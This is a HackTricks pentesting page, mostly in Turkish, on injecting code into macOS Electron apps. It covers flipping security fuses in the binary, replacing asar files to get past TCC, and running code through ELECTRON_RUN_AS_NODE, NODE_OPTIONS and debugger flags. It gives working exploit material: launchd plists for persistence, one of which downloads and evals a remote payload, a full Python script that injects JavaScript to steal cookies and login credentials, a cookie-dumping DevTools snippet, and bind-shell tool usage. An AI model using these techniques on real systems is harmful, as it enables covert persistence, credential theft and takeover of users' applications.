# macOS Electron Uygulamaları Enjeksiyonu

{{#include ../../../banners/hacktricks-training.md}}

## Temel Bilgiler

Eğer Electron'un ne olduğunu bilmiyorsanız [**burada çok fazla bilgi bulabilirsiniz**](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation). Ama şimdilik sadece Electron'un **node** çalıştırdığını bilin.\
Ve node'un belirtilen dosyanın dışında **başka kodlar çalıştırmak için** kullanılabilecek bazı **parametreleri** ve **env değişkenleri** vardır.

### Electron Füzeleri

Bu teknikler bir sonraki bölümde tartışılacak, ancak son zamanlarda Electron birkaç **güvenlik bayrağı ekledi**. Bunlar [**Electron Füzeleri**](https://www.electronjs.org/docs/latest/tutorial/fuses) ve bunlar macOS'taki Electron uygulamalarının **rastgele kod yüklemesini önlemek için** kullanılanlardır:

- **`RunAsNode`**: Devre dışı bırakıldığında, kod enjekte etmek için **`ELECTRON_RUN_AS_NODE`** env değişkeninin kullanılmasını engeller.
- **`EnableNodeCliInspectArguments`**: Devre dışı bırakıldığında, `--inspect`, `--inspect-brk` gibi parametreler dikkate alınmayacaktır. Bu şekilde kod enjekte etmenin önüne geçilir.
- **`EnableEmbeddedAsarIntegrityValidation`**: Etkinleştirildiğinde, yüklenen **`asar`** **dosyası** macOS tarafından **doğrulanacaktır**. Bu şekilde bu dosyanın içeriğini değiştirerek **kod enjeksiyonunu** önler.
- **`OnlyLoadAppFromAsar`**: Bu etkinleştirildiğinde, yüklemek için şu sırayı aramak yerine: **`app.asar`**, **`app`** ve en son **`default_app.asar`**. Sadece app.asar'ı kontrol edecek ve kullanacak, böylece **`embeddedAsarIntegrityValidation`** füzesi ile birleştirildiğinde **doğrulanmamış kodun yüklenmesi imkansız** hale gelir.
- **`LoadBrowserProcessSpecificV8Snapshot`**: Etkinleştirildiğinde, tarayıcı süreci V8 anlık görüntüsü için `browser_v8_context_snapshot.bin` adlı dosyayı kullanır.

Kod enjeksiyonunu önlemeyecek başka ilginç bir füze:

- **EnableCookieEncryption**: Etkinleştirildiğinde, disk üzerindeki çerez deposu OS düzeyinde kriptografi anahtarları kullanılarak şifrelenir.

### Electron Füzelerini Kontrol Etme

Bir uygulamadan **bu bayrakları kontrol edebilirsiniz**:
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Electron Füzelerini Değiştirme

As the [**docs mention**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), the configuration of the **Electron Fuses** are configured inside the **Electron binary** which contains somewhere the string **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**.

In macOS applications this is typically in `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
Bu dosyayı [https://hexed.it/](https://hexed.it/) adresinde yükleyebilir ve önceki dizeyi arayabilirsiniz. Bu dizeden sonra, her bir sigortanın devre dışı mı yoksa etkin mi olduğunu gösteren ASCII'de "0" veya "1" sayısını görebilirsiniz. **Sigorta değerlerini değiştirmek için** hex kodunu (`0x30` `0` ve `0x31` `1`'dir) değiştirin.

<figure><img src="../../../images/image (34).png" alt=""><figcaption></figcaption></figure>

Eğer bu baytları değiştirilmiş **`Electron Framework` ikili dosyasını** bir uygulamanın içine **overwrite** etmeye çalışırsanız, uygulama çalışmayacaktır.

## RCE Electron Uygulamalarına Kod Ekleme

Bir Electron Uygulamasının kullandığı **harici JS/HTML dosyaları** olabilir, bu nedenle bir saldırgan bu dosyalara kod enjekte edebilir ve uygulama bağlamında rastgele kod çalıştırabilir.

> [!CAUTION]
> Ancak, şu anda 2 sınırlama vardır:
>
> - Bir Uygulamayı değiştirmek için **`kTCCServiceSystemPolicyAppBundles`** izni **gerekir**, bu nedenle varsayılan olarak bu artık mümkün değildir.
> - Derlenmiş **`asap`** dosyası genellikle **`embeddedAsarIntegrityValidation`** `ve` **`onlyLoadAppFromAsar`** sigortalarını `etkin` olarak içerir.
>
> Bu saldırı yolunu daha karmaşık (veya imkansız) hale getirir.

**`kTCCServiceSystemPolicyAppBundles`** gereksinimini aşmanın mümkün olduğunu unutmayın; uygulamayı başka bir dizine (örneğin **`/tmp`**) kopyalayarak, klasörü **`app.app/Contents`**'ı **`app.app/NotCon`** olarak yeniden adlandırarak, **kötü niyetli** kodunuzla **asar** dosyasını **değiştirerek**, tekrar **`app.app/Contents`** olarak yeniden adlandırarak ve çalıştırarak bunu yapabilirsiniz.

Asar dosyasından kodu çıkarmak için:
```bash
npx asar extract app.asar app-decomp
```
Ve değiştirdikten sonra tekrar paketleyin:
```bash
npx asar pack app-decomp app-new.asar
```
## RCE with ELECTRON_RUN_AS_NODE

According to [**the docs**](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node), bu ortam değişkeni ayarlandığında, süreci normal bir Node.js süreci olarak başlatır.
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
> [!CAUTION]
> Eğer **`RunAsNode`** sigortası devre dışı bırakılırsa, env değişkeni **`ELECTRON_RUN_AS_NODE`** göz ardı edilecek ve bu çalışmayacaktır.

### Uygulama Plist'inden Enjeksiyon

[**burada önerildiği gibi**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), bu env değişkenini bir plist içinde kötüye kullanarak kalıcılığı sağlamak mümkün olabilir:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## RCE with `NODE_OPTIONS`

Yükü farklı bir dosyada saklayabilir ve çalıştırabilirsiniz:
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
> [!CAUTION]
> Eğer sigorta **`EnableNodeOptionsEnvironmentVariable`** **devre dışı** bırakılmışsa, uygulama **NODE_OPTIONS** ortam değişkenini başlatıldığında **yoksayacaktır**, eğer ortam değişkeni **`ELECTRON_RUN_AS_NODE`** ayarlanmadıysa, bu da sigorta **`RunAsNode`** devre dışı bırakılmışsa **yoksayılacaktır**.
>
> Eğer **`ELECTRON_RUN_AS_NODE`** ayarlamazsanız, **hata** ile karşılaşacaksınız: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`

### Uygulama Plist'inden Enjeksiyon

Bu ortam değişkenini bir plist içinde kötüye kullanarak kalıcılığı sağlamak için bu anahtarları ekleyebilirsiniz:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## RCE ile inceleme

According to [**this**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), if you execute an Electron application with flags such as **`--inspect`**, **`--inspect-brk`** and **`--remote-debugging-port`**, a **debug port will be open** so you can connect to it (for example from Chrome in `chrome://inspect`) and you will be able to **inject code on it** or even launch new processes.\
For example:
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
In [**bu blog yazısında**](https://hackerone.com/reports/1274695), bu hata ayıklama, başsız bir chrome'un **rastgele dosyaları rastgele konumlara indirmesi** için kötüye kullanılıyor.

> [!TIP]
> Eğer bir uygulama, `--inspect` gibi env değişkenlerinin veya parametrelerin ayarlanıp ayarlanmadığını kontrol etmenin kendi özel yoluna sahipse, `--inspect-brk` argümanını kullanarak bunu çalışma zamanında **bypass** etmeyi deneyebilirsiniz; bu, uygulamanın başında **çalışmayı durduracak** ve bir bypass gerçekleştirecektir (örneğin, mevcut sürecin argümanlarını veya env değişkenlerini geçersiz kılmak).

Aşağıdaki, uygulamayı `--inspect-brk` parametresi ile izleyip çalıştırarak, sahip olduğu özel korumayı (parametreleri `--inspect-brk`'yi kaldıracak şekilde geçersiz kılmak) aşmanın mümkün olduğu bir istismardı ve ardından uygulamadan çerezleri ve kimlik bilgilerini dökmek için bir JS yükü enjekte edildi:
```python
import asyncio
import websockets
import json
import requests
import os
import psutil
from time import sleep

INSPECT_URL = None
CONT = 0
CONTEXT_ID = None
NAME = None
UNIQUE_ID = None

JS_PAYLOADS = """
var { webContents } = require('electron');
var fs = require('fs');

var wc = webContents.getAllWebContents()[0]


function writeToFile(filePath, content) {
const data = typeof content === 'string' ? content : JSON.stringify(content, null, 2);

fs.writeFile(filePath, data, (err) => {
if (err) {
console.error(`Error writing to file ${filePath}:`, err);
} else {
console.log(`File written successfully at ${filePath}`);
}
});
}

function get_cookies() {
intervalIdCookies = setInterval(() => {
console.log("Checking cookies...");
wc.session.cookies.get({})
.then((cookies) => {
tokenCookie = cookies.find(cookie => cookie.name === "token");
if (tokenCookie){
writeToFile("/tmp/cookies.txt", cookies);
clearInterval(intervalIdCookies);
wc.executeJavaScript(`alert("Cookies stolen and written to /tmp/cookies.txt")`);
}
})
}, 1000);
}

function get_creds() {
in_location = false;
intervalIdCreds = setInterval(() => {
if (wc.mainFrame.url.includes("https://www.victim.com/account/login")) {
in_location = true;
console.log("Injecting creds logger...");
wc.executeJavaScript(`
(function() {
email = document.getElementById('login_email_id');
password = document.getElementById('login_password_id');
if (password && email) {
return email.value+":"+password.value;
}
})();
`).then(result => {
writeToFile("/tmp/victim_credentials.txt", result);
})
}
else if (in_location) {
wc.executeJavaScript(`alert("Creds stolen and written to /tmp/victim_credentials.txt")`);
clearInterval(intervalIdCreds);
}
}, 10); // Check every 10ms
setTimeout(() => clearInterval(intervalId), 20000); // Stop after 20 seconds
}

get_cookies();
get_creds();
console.log("Payloads injected");
"""

async def get_debugger_url():
"""
Fetch the local inspector's WebSocket URL from the JSON endpoint.
Assumes there's exactly one debug target.
"""
global INSPECT_URL

url = "http://127.0.0.1:9229/json"
response = requests.get(url)
data = response.json()
if not data:
raise RuntimeError("No debug targets found on port 9229.")
# data[0] should contain an object with "webSocketDebuggerUrl"
ws_url = data[0].get("webSocketDebuggerUrl")
if not ws_url:
raise RuntimeError("webSocketDebuggerUrl not found in inspector data.")
INSPECT_URL = ws_url


async def monitor_victim():
print("Monitoring victim process...")
found = False
while not found:
sleep(1)  # Check every second
for process in psutil.process_iter(attrs=['pid', 'name']):
try:
# Check if the process name contains "victim"
if process.info['name'] and 'victim' in process.info['name']:
found = True
print(f"Found victim process (PID: {process.info['pid']}). Terminating...")
os.kill(process.info['pid'], 9)  # Force kill the process
except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
# Handle processes that might have terminated or are inaccessible
pass
os.system("open /Applications/victim.app --args --inspect-brk")

async def bypass_protections():
global CONTEXT_ID, NAME, UNIQUE_ID
print(f"Connecting to {INSPECT_URL} ...")

async with websockets.connect(INSPECT_URL) as ws:
data = await send_cmd(ws, "Runtime.enable", get_first=True)
CONTEXT_ID = data["params"]["context"]["id"]
NAME = data["params"]["context"]["name"]
UNIQUE_ID = data["params"]["context"]["uniqueId"]

sleep(1)

await send_cmd(ws, "Debugger.enable", {"maxScriptsCacheSize": 10000000})

await send_cmd(ws, "Profiler.enable")

await send_cmd(ws, "Debugger.setBlackboxPatterns", {"patterns": ["/node_modules/|/browser_components/"], "skipAnonnymous": False})

await send_cmd(ws, "Runtime.runIfWaitingForDebugger")

await send_cmd(ws, "Runtime.executionContextCreated", get_first=False, params={"context": {"id": CONTEXT_ID, "origin": "", "name": NAME, "uniqueId": UNIQUE_ID, "auxData": {"isDefault": True}}})

code_to_inject = """process['argv'] = ['/Applications/victim.app/Contents/MacOS/victim']"""
await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression": code_to_inject, "uniqueContextId":UNIQUE_ID})
print("Injected code to bypass protections")


async def js_payloads():
global CONT, CONTEXT_ID, NAME, UNIQUE_ID

print(f"Connecting to {INSPECT_URL} ...")

async with websockets.connect(INSPECT_URL) as ws:
data = await send_cmd(ws, "Runtime.enable", get_first=True)
CONTEXT_ID = data["params"]["context"]["id"]
NAME = data["params"]["context"]["name"]
UNIQUE_ID = data["params"]["context"]["uniqueId"]
await send_cmd(ws, "Runtime.compileScript", get_first=False, params={"expression":JS_PAYLOADS,"sourceURL":"","persistScript":False,"executionContextId":1})
await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression":JS_PAYLOADS,"objectGroup":"console","includeCommandLineAPI":True,"silent":False,"returnByValue":False,"generatePreview":True,"userGesture":False,"awaitPromise":False,"replMode":True,"allowUnsafeEvalBlockedByCSP":True,"uniqueContextId":UNIQUE_ID})



async def main():
await monitor_victim()
sleep(3)
await get_debugger_url()
await bypass_protections()

sleep(7)

await js_payloads()



async def send_cmd(ws, method, get_first=False, params={}):
"""
Send a command to the inspector and read until we get a response with matching "id".
"""
global CONT

CONT += 1

# Send the command
await ws.send(json.dumps({"id": CONT, "method": method, "params": params}))
sleep(0.4)

# Read messages until we get our command result
while True:
response = await ws.recv()
data = json.loads(response)

# Print for debugging
print(f"[{method} / {CONT}] ->", data)

if get_first:
return data

# If this message is a response to our command (by matching "id"), break
if data.get("id") == CONT:
return data

# Otherwise it's an event or unrelated message; keep reading

if __name__ == "__main__":
asyncio.run(main())
```
> [!CAUTION]
> Eğer **`EnableNodeCliInspectArguments`** sigortası devre dışı bırakılmışsa, uygulama başlatıldığında **node parametrelerini** (örneğin `--inspect`) **göz ardı edecektir**, eğer ortam değişkeni **`ELECTRON_RUN_AS_NODE`** ayarlanmamışsa, bu da **göz ardı edilecektir** eğer sigorta **`RunAsNode`** devre dışı bırakılmışsa.
>
> Ancak, **electron parametresi `--remote-debugging-port=9229`** kullanarak hala bazı bilgileri çalabilirsiniz, örneğin **geçmiş** (GET komutları ile) veya tarayıcının **çerezleri** (çünkü bunlar tarayıcı içinde **şifresi çözülmüş** durumdadır ve bunları verecek bir **json uç noktası** vardır).

Bunu nasıl yapacağınızı [**burada**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) ve [**burada**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) öğrenebilirsiniz ve otomatik aracı [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) veya basit bir script kullanabilirsiniz:
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
### Injection from the App Plist

Bu env değişkenini bir plist içinde kötüye kullanarak kalıcılığı sağlamak için bu anahtarları ekleyebilirsiniz:
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## TCC Bypass eski sürümleri istismar etme

> [!TIP]
> macOS'taki TCC daemon, uygulamanın yürütülen sürümünü kontrol etmez. Bu nedenle, **bir Electron uygulamasına kod enjekte edemiyorsanız** önceki tekniklerden herhangi biriyle, APP'nin önceki bir sürümünü indirip üzerine kod enjekte edebilirsiniz çünkü hala TCC ayrıcalıklarını alacaktır (Trust Cache engellemediği sürece).

## JS Dışı Kod Çalıştırma

Önceki teknikler, **electron uygulamasının sürecinde JS kodu çalıştırmanıza** izin verecektir. Ancak, **çocuk süreçlerin ana uygulama ile aynı sandbox profilinde çalıştığını** ve **TCC izinlerini miras aldığını** unutmayın.\
Bu nedenle, örneğin kameraya veya mikrofona erişmek için hakları istismar etmek istiyorsanız, **süreçten başka bir ikili dosya çalıştırabilirsiniz**.

## Otomatik Enjeksiyon

- [**electroniz3r**](https://github.com/r3ggi/electroniz3r)

Araç [**electroniz3r**](https://github.com/r3ggi/electroniz3r), **kurulu savunmasız electron uygulamalarını bulmak** ve bunlara kod enjekte etmek için kolayca kullanılabilir. Bu araç, **`--inspect`** tekniğini kullanmaya çalışacaktır:

Kendiniz derlemeniz gerekiyor ve bunu şu şekilde kullanabilirsiniz:
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
- [https://github.com/boku7/Loki](https://github.com/boku7/Loki)

Loki, Electron uygulamalarını arka kapı ile ele geçirmek için uygulamaların JavaScript dosyalarını Loki Komut ve Kontrol JavaScript dosyaları ile değiştirmek üzere tasarlandı.


## References

- [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
- [https://m.youtube.com/watch?v=VWQY5R2A6X8](https://m.youtube.com/watch?v=VWQY5R2A6X8)

{{#include ../../../banners/hacktricks-training.md}}
